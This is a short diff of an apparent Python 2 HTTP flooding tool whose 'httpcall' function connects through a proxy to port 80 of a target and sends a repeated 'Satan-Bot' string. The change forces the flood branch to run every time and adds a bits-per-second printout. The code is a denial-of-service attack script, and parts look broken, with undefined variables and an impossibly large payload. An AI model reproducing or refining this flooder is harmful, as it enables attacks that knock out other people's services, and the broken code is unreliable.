@@ -85,9 +85,11 @@ def httpcall(url):
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	socks.setdefaultproxy(socks.PROXY_TYPE_HTTP, prox, 80)
 	bytes = random._urandom(0)
+	current = time.time() - start
+	bps = (nbytes*8)/current
 	pkt_count = 0
 	try:
-		if i == 150000000:
+		if 950000000 == 950000000:
 			s.connect((url,80))
 			s.send("Satan-Bot" * 109951162777600)
 		
@@ -95,7 +97,7 @@ def httpcall(url):
 			
 	except socket.error:
 						
-			print "Lizarded"
+			print "b/ps: %s" % bps
 
 	
 #http caller thread 
